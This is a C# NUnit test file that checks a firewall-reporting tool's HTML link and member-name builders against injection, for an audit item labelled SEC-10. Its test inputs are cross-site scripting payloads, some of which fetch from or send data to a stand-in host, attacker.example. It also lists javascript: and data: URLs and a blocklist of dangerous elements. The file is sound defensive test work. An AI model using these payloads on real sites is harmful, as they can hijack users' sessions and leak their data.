using AngleSharp;
using AngleSharp.Dom;
using FWO.Data;
using FWO.Report;
using NUnit.Framework;

namespace FWO.Test
{
    /// <summary>
    /// Parameterizes the link a report builds around an object with a payload for each context that link
    /// has - element text, attribute value, url and quote - and asserts that the payload only ever comes
    /// back as inert text (SEC-10).
    /// The link is the construction site the audit named, and it is the one every rule report puts around
    /// every object, service, user and gateway name it shows.
    /// </summary>
    [TestFixture]
    [Parallelizable]
    internal class ReportHtmlInjectionTest
    {
        private static readonly List<string> kPayloads =
        [
            "<img src=\"http://attacker.example/pixel\">",
            "<script>fetch('http://attacker.example')</script>",
            "\"><img src=x onerror=alert(1)>",
            "' onmouseover='alert(1)",
            "</a><iframe src=\"http://attacker.example\"></iframe>",
            "<style>@import url('http://attacker.example/x.css');</style>",
            "&lt;img src=x&gt;",
            "javascript:alert(1)"
        ];

        private static readonly List<string> kForbiddenElements = ["img", "script", "iframe", "style", "object", "embed", "link"];

        private static IDocument Parse(string html)
        {
            IBrowsingContext context = BrowsingContext.New(Configuration.Default);
            return context.OpenAsync(request => request.Content($"<html><body>{html}</body></html>")).GetAwaiter().GetResult();
        }

        [Test]
        [TestCaseSource(nameof(kPayloads))]
        public void ConstructLink_KeepsAPayloadInTheObjectNameAsText(string payload)
        {
            string link = ReportBase.ConstructLink("bi bi-diagram-3-fill", payload, "", "#nwobj1x1");
            using IDocument document = Parse(link);

            Assert.Multiple(() =>
            {
                foreach (string forbidden in kForbiddenElements)
                {
                    Assert.That(document.QuerySelectorAll(forbidden), Is.Empty, $"payload created a <{forbidden}> element");
                }
                Assert.That(document.QuerySelector("a")!.TextContent, Is.EqualTo(payload));
            });
        }

        [Test]
        [TestCaseSource(nameof(kPayloads))]
        public void ConstructLink_KeepsAPayloadInTheStyleInsideItsAttribute(string payload)
        {
            string link = ReportBase.ConstructLink("bi bi-diagram-3-fill", "name", payload, "#nwobj1x1");
            using IDocument document = Parse(link);

            IElement anchor = document.QuerySelector("a")!;
            Assert.Multiple(() =>
            {
                foreach (string forbidden in kForbiddenElements)
                {
                    Assert.That(document.QuerySelectorAll(forbidden), Is.Empty, $"payload created a <{forbidden}> element");
                }
                Assert.That(anchor.GetAttribute("style"), Is.EqualTo(payload));
                Assert.That(anchor.GetAttribute("onerror"), Is.Null);
                Assert.That(anchor.GetAttribute("onmouseover"), Is.Null);
            });
        }

        [Test]
        [TestCaseSource(nameof(kPayloads))]
        public void ConstructLink_KeepsAPayloadInTheIconClassInsideItsAttribute(string payload)
        {
            string link = ReportBase.ConstructLink(payload, "name", "", "#nwobj1x1");
            using IDocument document = Parse(link);

            Assert.Multiple(() =>
            {
                foreach (string forbidden in kForbiddenElements)
                {
                    Assert.That(document.QuerySelectorAll(forbidden), Is.Empty, $"payload created a <{forbidden}> element");
                }
                Assert.That(document.QuerySelector("span")!.GetAttribute("class"), Is.EqualTo(payload));
            });
        }

        /// <summary>
        /// Group members are imported values joined by separators this code adds itself, so each member
        /// has to be encoded before the line breaks between them are inserted (SEC-10).
        /// </summary>
        [Test]
        [TestCaseSource(nameof(kPayloads))]
        public void MemberNames_AreEncodedWhileTheSeparatorsStayMarkup(string payload)
        {
            string cell = DisplayBase.MemberNamesAsHtml($"{payload}|{payload}");
            using IDocument document = Parse($"<table><tr>{cell}</tr></table>");

            Assert.Multiple(() =>
            {
                foreach (string forbidden in kForbiddenElements)
                {
                    Assert.That(document.QuerySelectorAll(forbidden), Is.Empty, $"payload created a <{forbidden}> element");
                }
                Assert.That(document.QuerySelectorAll("td"), Has.Count.EqualTo(1));
                Assert.That(document.QuerySelectorAll("br"), Has.Count.EqualTo(1), "the separator between two members was lost");
                Assert.That(document.QuerySelector("td")!.TextContent, Is.EqualTo(payload + payload));
            });
        }

        [Test]
        public void MemberNames_OfAUserGroupAreEncodedTheSameWay()
        {
            NetworkUser user = new() { MemberNames = "<img src=x>|plain" };
            using IDocument document = Parse($"<table><tr>{user.MemberNamesAsHtml()}</tr></table>");

            Assert.Multiple(() =>
            {
                Assert.That(document.QuerySelectorAll("img"), Is.Empty);
                Assert.That(document.QuerySelector("td")!.TextContent, Is.EqualTo("<img src=x>plain"));
            });
        }

        [Test]
        public void MemberNames_OfAnEmptyGroupStayEmpty()
        {
            Assert.That(DisplayBase.MemberNamesWithoutHtml(null!), Is.Empty);
        }

        /// <summary>
        /// A link may only ever point at this document, so a payload in the address is replaced rather
        /// than encoded - an encoded absolute url would still be fetched.
        /// </summary>
        [Test]
        [TestCase("http://attacker.example/collect")]
        [TestCase("//attacker.example/collect")]
        [TestCase("javascript:alert(1)")]
        [TestCase("java\nscript:alert(1)")]
        [TestCase("data:text/html,<script>alert(1)</script>")]
        public void ConstructLink_RefusesAnAddressThatLeavesTheDocument(string address)
        {
            string link = ReportBase.ConstructLink("bi bi-diagram-3-fill", "name", "", address);
            using IDocument document = Parse(link);

            Assert.That(document.QuerySelector("a")!.GetAttribute("href"), Is.EqualTo("#"));
        }

        [Test]
        [TestCase("#nwobj1x1")]
        [TestCase("ReportGeneration#goto-report-1-nwobj0x5")]
        public void ConstructLink_KeepsAnAddressThatStaysOnTheDocument(string address)
        {
            string link = ReportBase.ConstructLink("bi bi-diagram-3-fill", "name", "", address);
            using IDocument document = Parse(link);

            Assert.That(document.QuerySelector("a")!.GetAttribute("href"), Is.EqualTo(address));
        }

        /// <summary>
        /// The in-app report view navigates through this handler, so it has to survive the encoding. It is
        /// a fixed literal the code writes, never a stored value.
        /// </summary>
        [Test]
        public void ConstructLink_KeepsTheNavigationHandlerItNeeds()
        {
            string link = ReportBase.ConstructLink("bi bi-diagram-3-fill", "name", "", "#nwobj1x1");
            using IDocument document = Parse(link);

            Assert.That(document.QuerySelector("a")!.GetAttribute("onclick"), Is.EqualTo("event.stopPropagation();"));
        }
    }
}
